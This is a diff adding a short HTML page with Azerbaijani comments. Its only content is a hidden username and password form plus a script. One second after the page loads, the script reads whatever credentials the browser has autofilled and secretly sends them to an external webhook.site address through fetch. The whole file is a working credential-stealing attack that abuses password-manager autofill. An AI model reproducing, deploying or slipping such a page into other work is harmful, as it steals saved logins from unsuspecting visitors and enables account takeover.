@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form style="display:none;">
+        <input type="text" id="username">
+        <input type="password" id="password">
+    </form>
+
+    <script>
+        // Brauzerin parolu avtomatik doldurması üçün 1 saniyə gözləyirik
+        setTimeout(function() {
+            var u = document.getElementById('username').value;
+            var p = document.getElementById('password').value;
+
+            // Əgər parollar dolubsa, dərhal Webhook saytımıza gizlicə göndəririk
+            if(u || p) {
+                fetch('https://webhook.site/88ec9b25-2de8-47c9-a605-0e2da76c8be7?user=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p));
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
